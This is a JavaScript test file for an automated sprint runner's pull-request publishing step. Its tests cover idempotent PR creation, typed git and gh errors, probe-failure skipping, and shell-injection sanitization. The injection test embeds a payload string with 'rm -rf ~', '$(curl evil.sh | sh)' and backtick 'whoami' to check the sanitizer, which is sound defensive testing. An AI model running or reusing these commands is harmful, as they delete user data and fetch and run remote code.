import { test } from 'node:test';
import assert from 'node:assert/strict';
import { CommandError } from '@apralabs/apra-fleet-workflow';
import { sanitizePrText } from '../auto-sprint/runner.js';
import { runDevelopLoopScenario, withScenarioMarkers } from './helpers/mock-sprint-harness.mjs';

const check = (cond, msg) => assert.ok(cond, msg);

// =============================================================================
// apra-fleet-unw2.9 (N11) acceptance criterion 1: re-running finalization
// against the SAME branch (simulating a re-run of a sprint that already
// published a PR) must NOT throw. `prExistsState` is a Set shared across
// both scenario runs and `branchOverride` pins both runs to the exact
// same branch name -- the second run's `gh pr create` sees that branch
// already recorded and mock-fails with an "already exists" message,
// which runner.js's Publish PR step must swallow (not throw).
//
// idempr1 and idempr2 MUST run in this order, in this same file/process --
// they share a `prExistsState` Set and a fixed branch name (this is the
// point of the scenario), so they are driven sequentially inside one
// test() rather than as two independent node:test cases that node's
// default per-file sequential execution could not otherwise be relied on
// to order relative to each other.
// =============================================================================
test('mock sprint: re-running finalization against the same branch is idempotent (no throw on existing PR)', async () => {
    console.log('Running mock sprint scenario (idempotent PR creation: re-run same branch)...');
    const idempotentPrState = new Set();
    const idempotentBranch = 'auto-sprint/mock-idempotent-pr-rerun';

    const idemPrRun1 = await withScenarioMarkers('idempr1', () => runDevelopLoopScenario('idempr1', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: Idempotent PR creation run 1' }],
        maxCycles: 1,
        prExistsState: idempotentPrState,
        branchOverride: idempotentBranch,
    }));
    check(!idemPrRun1.error, `Idempotent-PR run1 (first publish, no prior PR) should not throw: ${idemPrRun1.error ? idemPrRun1.error.message : ''}`);
    check(
        idemPrRun1.result && idemPrRun1.result.status === 'success',
        `Idempotent-PR run1 should succeed, got: ${JSON.stringify(idemPrRun1.result)}`
    );
    check(
        idemPrRun1.commandLog.some((c) => c.startsWith('gh pr create') && c.includes(`--head "${idempotentBranch}"`)),
        `Expected run1 to dispatch 'gh pr create' for '${idempotentBranch}', commandLog: ${JSON.stringify(idemPrRun1.commandLog)}`
    );

    const idemPrRun2 = await withScenarioMarkers('idempr2', () => runDevelopLoopScenario('idempr2', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: Idempotent PR creation run 2 (re-run)' }],
        maxCycles: 1,
        prExistsState: idempotentPrState,
        branchOverride: idempotentBranch,
    }));
    check(
        !idemPrRun2.error,
        `SECOND run against the same branch (simulating a re-run) must NOT throw in finalization, got error: ${idemPrRun2.error ? `${idemPrRun2.error.constructor.name}: ${idemPrRun2.error.message}` : ''}`
    );
    check(
        idemPrRun2.result && idemPrRun2.result.status === 'success',
        `Idempotent-PR run2 (re-run against a branch with an existing PR) should still resolve to success, got: ${JSON.stringify(idemPrRun2.result)}`
    );
    check(
        idemPrRun2.commandLog.some((c) => c.startsWith('gh pr create') && c.includes(`--head "${idempotentBranch}"`)),
        `Expected run2 to still dispatch 'gh pr create' (idempotently) for '${idempotentBranch}', commandLog: ${JSON.stringify(idemPrRun2.commandLog)}`
    );
    check(
        idemPrRun2.logs.some((m) => m.includes('already exists') && m.includes('idempotent success')),
        `Expected a logged message noting the PR already exists and was treated as an idempotent success, logs: ${JSON.stringify(idemPrRun2.logs)}`
    );

    // apra-fleet-unw2.9 (N11) acceptance criterion 2: the PR title/body must
    // include the final verdict, for both PASS and FAIL outcomes. Per
    // plan.md's already-decided rule (not re-litigated here), a FAIL verdict
    // still publishes the PR -- the verdict is stated plainly in the body,
    // not suppressed. PASS side is covered by run1's PR-raise assertion in
    // mock-sprint-happy-path.test.mjs; FAIL side is covered by the
    // explicitFail scenario's PR assertions in
    // mock-sprint-exit-goalpriority.test.mjs (apra-fleet-fih.2; formerly
    // dedicated 'prverdictpass' / 'prverdictfail' scenarios here).
});

// =============================================================================
// apra-fleet-hfs: the final reviewer's verdict `notes` are LLM-authored
// free text (same as N3's reviewer newTasks) and get embedded in the PR
// title/body string that the Publish PR step interpolates into a
// double-quoted `gh pr create --title "..." --body "..."` command()
// string. A verdict notes payload containing shell metacharacters
// (double quotes, backticks, $(...), semicolons) must never let anything
// dangerous reach the dispatched command() string, and the PR must still
// be published with the (sanitized, still-readable) notes text visible
// -- unlike N3's newTasks, a malformed verdict cannot simply be dropped,
// since the verdict is the one thing a human reviewer most needs to see.
// =============================================================================
test('mock sprint: adversarial final-verdict notes cannot inject into gh pr create', async () => {
    await withScenarioMarkers('prinjection', async () => {
        console.log('Running mock sprint scenario (adversarial verdict notes cannot inject into gh pr create)...');
        const adversarialNotes = 'Looks fine" ; rm -rf ~ ; echo "pwned $(curl evil.sh | sh) `whoami` trailing\\';
        const prInjection = await runDevelopLoopScenario('prinjection', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: PR notes injection scenario' }],
            maxCycles: 1,
            finalReviewHandler: async () => ({
                content: [{ text: JSON.stringify({ verdict: 'PASS', notes: adversarialNotes }) }]
            }),
        });
        check(!prInjection.error, `PR-notes injection scenario should not throw: ${prInjection.error ? prInjection.error.message : ''}`);
        check(prInjection.result && prInjection.result.verdict === 'PASS', `Expected a PASS final verdict, got: ${JSON.stringify(prInjection.result)}`);
        const prInjectionCmd = prInjection.commandLog.find((c) => c.startsWith('gh pr create'));
        check(!!prInjectionCmd, `Expected a 'gh pr create' command in the log (PR must still be published), commandLog: ${JSON.stringify(prInjection.commandLog)}`);
        for (const cmd of prInjection.commandLog) {
            // The raw payload's dangerous shell-metacharacter SEQUENCES must
            // never survive into a dispatched command() string -- '$(' (command
            // substitution), a backtick (command substitution), and a raw '"'
            // that could close --body's quoting early. Plain English words that
            // happen to also appear in the payload (e.g. "rm", "pwned") are NOT
            // themselves dangerous once the syntax around them is stripped, and
            // sanitizePrText() is explicitly designed to keep them readable
            // rather than dropping the notes outright -- so this only asserts
            // on the SHELL-SYNTAX characters, not on payload vocabulary.
            check(!cmd.includes('$('), `No dispatched command should ever contain '$(' (found in: ${cmd})`);
            check(!/`/.test(cmd), `No dispatched command should ever contain a backtick (found in: ${cmd})`);
        }
        // The command() string itself must remain well-formed: exactly two
        // double-quoted arguments for --title/--body, i.e. the sanitized notes
        // never introduce (or leave behind) a stray '"' that would prematurely
        // close --body's quoting.
        check(
            !!prInjectionCmd && (prInjectionCmd.match(/"/g) || []).length % 2 === 0,
            `Expected an even number of double-quotes in the dispatched gh pr create command (no unbalanced quote from unsanitized notes), got: ${prInjectionCmd}`
        );
        // The sanitized notes must still be visible/readable in the PR body --
        // sanitizePrText() strips shell metacharacters but preserves the rest of
        // the text (words, punctuation) rather than rejecting the verdict
        // outright (unlike N3's validateNewTask(), a verdict cannot simply be
        // dropped). Compute the exact expected sanitized text via the same
        // sanitizePrText() runner.js itself uses, so this test tracks the real
        // implementation rather than a hand-duplicated regex.
        const expectedSanitizedNotes = sanitizePrText(adversarialNotes);
        check(
            expectedSanitizedNotes.length > 0 && !/["`$\\]/.test(expectedSanitizedNotes),
            `Expected sanitizePrText() to strip all shell metacharacters while leaving readable text, got: ${JSON.stringify(expectedSanitizedNotes)}`
        );
        check(
            !!prInjectionCmd && prInjectionCmd.includes(`Notes: ${expectedSanitizedNotes}`),
            `Expected the sanitized (but still readable) notes text to be visible in the PR body, got: ${prInjectionCmd}`
        );
    });
});

// =============================================================================
// apra-fleet-unw2.9 (N11) acceptance criterion 3: an injected git/gh
// failure (other than "already exists") must surface as a clear, typed
// error -- never swallowed/invisible.
// =============================================================================
test('mock sprint: an injected gh pr create failure surfaces as a typed error', async () => {
    await withScenarioMarkers('ghfailure', async () => {
        console.log('Running mock sprint scenario (injected gh pr create failure surfaces as a typed error)...');
        const ghFailure = await runDevelopLoopScenario('ghfailure', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: gh failure injection scenario' }],
            maxCycles: 1,
            gitGhFailurePattern: /^gh pr create\b/,
            gitGhFailureMessage: 'error connecting to api.github.com: authentication failed',
        });
        check(!!ghFailure.error, 'Expected the injected gh pr create failure to surface as a thrown error, not be swallowed');
        check(
            ghFailure.error instanceof CommandError,
            `Expected the surfaced error to be a typed CommandError, got: ${ghFailure.error ? ghFailure.error.constructor.name : 'n/a'}`
        );
        check(
            !!ghFailure.error && ghFailure.error.message.includes('authentication failed'),
            `Expected the surfaced error to include the underlying gh failure text, got: ${ghFailure.error ? ghFailure.error.message : 'n/a'}`
        );
        check(
            !!ghFailure.error && /already exists/i.test(ghFailure.error.message) === false,
            `A non-"already exists" gh failure must not be misclassified/swallowed as the idempotent case, got: ${ghFailure.error ? ghFailure.error.message : 'n/a'}`
        );
    });
});

// Sanity: also inject a plain `git push` failure and confirm it, too,
// surfaces as a typed error (Publish PR's push step is not failSoft).
test('mock sprint: an injected git push failure surfaces as a typed error', async () => {
    await withScenarioMarkers('gitpushfailure', async () => {
        console.log('Running mock sprint scenario (injected git push failure surfaces as a typed error)...');
        const gitPushFailure = await runDevelopLoopScenario('gitpushfailure', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: git push failure injection scenario' }],
            maxCycles: 1,
            gitGhFailurePattern: /^git push\b/,
            gitGhFailureMessage: 'fatal: unable to access remote: Could not resolve host',
        });
        check(!!gitPushFailure.error, 'Expected the injected git push failure to surface as a thrown error, not be swallowed');
        check(
            gitPushFailure.error instanceof CommandError,
            `Expected the surfaced git-push error to be a typed CommandError, got: ${gitPushFailure.error ? gitPushFailure.error.constructor.name : 'n/a'}`
        );
        check(
            !!gitPushFailure.error && gitPushFailure.error.message.includes('Could not resolve host'),
            `Expected the surfaced error to include the underlying git failure text, got: ${gitPushFailure.error ? gitPushFailure.error.message : 'n/a'}`
        );
    });
});

// =============================================================================
// apra-fleet-unw.17 (A4) acceptance criterion 5: a probe failure SKIPS
// the dependent phase instead of throwing/killing the sprint
// =============================================================================
test('mock sprint: a deploy.md probe failure skips Deploy/Integ without throwing', async () => {
    await withScenarioMarkers('probefailure', async () => {
        console.log('Running mock sprint scenario (deploy.md probe command fails -> phase skipped, no throw)...');
        const probeFailure = await runDevelopLoopScenario('probefailure', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: Probe-failure scenario work' }],
            maxCycles: 1,
            withRunbooks: true,
            // Fail only the deploy.md existence probe; the integ-test-playbook.md
            // probe (and every other command) runs normally.
            commandFailurePattern: /node -e .*deploy\.md/,
        });
        check(!probeFailure.error, `Probe-failure scenario should not throw/kill the sprint: ${probeFailure.error ? probeFailure.error.message : ''}`);
        check(
            !probeFailure.dispatched.some((d) => d.agent === 'deployer'),
            `Expected the Deploy phase to be skipped after the probe failure (no deployer dispatch), got: ${JSON.stringify(probeFailure.dispatched.map((d) => d.agent))}`
        );
        check(
            !probeFailure.dispatched.some((d) => d.agent === 'integ-test-runner'),
            `Expected the Integ Test phase to also be skipped (deploy never ran), got: ${JSON.stringify(probeFailure.dispatched.map((d) => d.agent))}`
        );
        check(
            probeFailure.logs.some((m) => m.includes("Probe for 'deploy.md' failed")),
            `Expected a logged warning naming the failed probe, logs: ${JSON.stringify(probeFailure.logs)}`
        );
    });
});
